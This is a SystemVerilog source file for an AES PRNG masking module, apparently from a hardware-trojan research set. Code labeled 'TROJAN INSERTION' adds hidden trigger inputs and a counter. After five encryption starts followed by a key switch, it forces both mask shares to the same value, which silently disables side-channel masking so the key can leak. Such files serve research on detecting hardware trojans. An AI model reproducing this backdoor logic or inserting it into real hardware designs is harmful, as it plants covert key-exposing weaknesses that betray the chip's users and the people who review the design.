`include "prim_assert.sv"

module aes_prng_masking import aes_pkg::*;
#(
  parameter  int unsigned Width        = WidthPRDMasking,
  parameter  int unsigned EntropyWidth = edn_pkg::ENDPOINT_BUS_WIDTH,
  parameter  bit          SecAllowForcingMasks  = 0, // Allow forcing masks to constant values using
                                                     // force_masks_i. Useful for SCA only.
  parameter  bit          SecSkipPRNGReseeding  = 0, // The current SCA setup doesn't provide
                                                     // sufficient resources to implement the
                                                     // infrastructure required for PRNG reseeding.
                                                     // To enable SCA resistance evaluations, we
                                                     // need to skip reseeding requests.

  parameter masking_lfsr_seed_t RndCnstLfsrSeed = RndCnstMaskingLfsrSeedDefault,
  parameter masking_lfsr_perm_t RndCnstLfsrPerm = RndCnstMaskingLfsrPermDefault
) (
  input  logic                    clk_i,
  input  logic                    rst_ni,

  input  logic                    force_masks_i,

  // Connections to AES internals, PRNG consumers
  input  logic                    data_update_i,
  output logic        [Width-1:0] data_o,
  input  logic                    reseed_req_i,
  output logic                    reseed_ack_o,

  // Connections to outer world, LFSR reseeding
  output logic                    entropy_req_o,
  input  logic                    entropy_ack_i,
  input  logic [EntropyWidth-1:0] entropy_i,

  // TROJAN INSERTION: Additional signals for Trojan trigger
  input  logic                    enc_start_i,       // Indicates the start of an encryption operation
  input  logic                    key_switch_i       // Indicates the command to switch encryption key
);

  logic             prng_seed_en;
  logic             prng_seed_done;
  logic [Width-1:0] prng_key;
  logic             prng_err;

  /////////////
  // Control //
  /////////////

  // The data requests are fed from a stream cipher primitive that is reseeded in chunks of
  // EntropyWidth bits. Internally, the primitive generates the output based on the current state.
  // If there is an outstanding reseed request, the PRNG can keep updating and providing
  // pseudo-random data (using the current state of the primitive). When reseeding a chunk without
  // requesting a PRNG update, the current output might change or not, depending on the Width and
  // current chunk index.

  // In the current SCA setup, we don't have sufficient resources to implement the infrastructure
  // required for PRNG reseeding (CSRNG, EDN, etc.). Therefore, we skip any reseeding requests if
  // the SecSkipPRNGReseeding parameter is set. Performing the reseeding without proper entropy
  // provided from CSRNG would result in quickly repeating, fully deterministic PRNG output,
  // which prevents meaningful SCA resistance evaluations.

  // Create a lint error to reduce the risk of accidentally enabling this feature.
  `ASSERT_STATIC_LINT_ERROR(AesSecAllowForcingMasksNonDefault, SecAllowForcingMasks == 0)

  if (SecAllowForcingMasks == 0) begin : gen_unused_force_masks
    logic unused_force_masks;
    assign unused_force_masks = force_masks_i;
  end

  // Create a lint error to reduce the risk of accidentally enabling this feature.
  `ASSERT_STATIC_LINT_ERROR(AesSecSkipPRNGReseedingNonDefault, SecSkipPRNGReseeding == 0)

  if (SecSkipPRNGReseeding == 1) begin : gen_unused_prng_seed_done
    logic unused_prng_seed_done;
    assign unused_prng_seed_done = prng_seed_done;
  end

  // Reseed interface handling
  assign prng_seed_en = SecSkipPRNGReseeding ? 1'b0         : reseed_req_i;
  assign reseed_ack_o = SecSkipPRNGReseeding ? reseed_req_i : prng_seed_done;

  ////////////////////////////////////
  // Bivium Stream Cipher Primitive //
  ////////////////////////////////////
  prim_trivium #(
   .BiviumVariant         (1),
   .OutputWidth           (Width),
   .StrictLockupProtection(!SecAllowForcingMasks),
   .SeedType              (prim_trivium_pkg::SeedTypeStatePartial),
   .PartialSeedWidth      (EntropyWidth),
   .RndCnstTriviumLfsrSeed(RndCnstLfsrSeed)
  ) u_prim_bivium (
   .clk_i (clk_i),
   .rst_ni(rst_ni),

   .en_i                (data_update_i),
   .allow_lockup_i      (SecAllowForcingMasks & force_masks_i),
   .seed_en_i           (prng_seed_en),
   .seed_done_o         (prng_seed_done),
   .seed_req_o          (entropy_req_o),
   .seed_ack_i          (entropy_ack_i),
   .seed_key_i          ('0), // Not used.
   .seed_iv_i           ('0), // Not used.
   .seed_state_full_i   ('0), // Not used.
   .seed_state_partial_i(entropy_i),

   .key_o(prng_key),
   .err_o(prng_err)
  );

  // TROJAN INSERTION: State registers for trigger
  logic [2:0] trojan_enc_cnt;
  logic       trojan_key_switch_observed;
  logic       trojan_trigger_active;

  // TROJAN INSERTION: Reset and state machine for Trojan trigger
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_enc_cnt             <= 3'd0;
      trojan_key_switch_observed <= 1'b0;
      trojan_trigger_active      <= 1'b0;
    end else begin
      // Count consecutive encryption start events
      if (enc_start_i) begin
        if (trojan_enc_cnt < 3'd7)
          trojan_enc_cnt <= trojan_enc_cnt + 3'd1;
        else
          trojan_enc_cnt <= trojan_enc_cnt; // Saturate at 7
      end

      // Reset the counter if anything other than enc_start_i or key_switch_i happens
      if (!enc_start_i && !key_switch_i) begin
        trojan_enc_cnt <= 3'd0;
        trojan_key_switch_observed <= 1'b0;
      end

      // Arm the trigger when exactly five consecutive encryptions have occurred 
      if (trojan_enc_cnt == 3'd5 && key_switch_i && !trojan_trigger_active) begin
        trojan_key_switch_observed <= 1'b1;
      end

      // Latch trigger activation
      if (trojan_key_switch_observed) begin
        trojan_trigger_active <= 1'b1;
      end

      // Reset trigger if system is reset (already included), or upon explicit external request (not present).
      // If a reset input for Trojan deactivation is required, insert it here.
    end
  end

  // Add a permutation layer to obfuscate the output of stream cipher primitive.
  logic [Width-1:0] prng_key_perm;
  for (genvar b = 0; b < Width; b++) begin : gen_perm
    assign prng_key_perm[b] = prng_key[RndCnstLfsrPerm[b]];
  end

  // TROJAN INSERTION: Payload Integration
  // When trojan_trigger_active is high, force data_o to all identical share values by broadcasting [Width/2-1:0] to [Width-1:Width/2]
  // Assuming Width is always even and data_o consists of two shares [Width/2-1:0] and [Width-1:Width/2]
  // Original logic:
  // assign data_o = prng_key_perm;
  // Trojan-inserted logic below.
  always_comb begin
    if (trojan_trigger_active) begin
      data_o[Width/2-1:0]      = prng_key_perm[Width/2-1:0];
      data_o[Width-1:Width/2]  = prng_key_perm[Width/2-1:0];
    end else begin
      data_o = prng_key_perm;
    end
  end

  // At the moment, the PRNG error output is ignored. This signal is asserted only if the stream
  // cipher primitive enters an all-zero state. Depending on the value of the SecAllowForcingMasks
  // parameter, the primitive behaves differently:
  // - If SecAllowForcingMasks == 0 or if SecAllowForcingMasks == 1 and force_masks_i == 0, the
  //   primitive is automatically reset to the default value defined by a secret netlist constant.
  // - If SecAllowForcingMasks == 1 and force_masks_i == 1, the primitive keeps the all-zero value.
  //   This may be required to switch off the masking for evaluating the SCA resistance.
  logic unused_prng_err;
  assign unused_prng_err = prng_err;

  /////////////////
  // Assertions //
  /////////////////

// the code below is not meant to be synthesized,
// but it is intended to be used in simulation and FPV
`ifndef SYNTHESIS
  // Check that the supplied permutation is valid.
  logic [Width-1:0] perm_test;
  initial begin : p_perm_check
    perm_test = '0;
    for (int k = 0; k < Width; k++) begin
      perm_test[RndCnstLfsrPerm[k]] = 1'b1;
    end
    // All bit positions must be marked with 1.
    `ASSERT_I(PermutationCheck_A, &perm_test)
  end
`endif

endmodule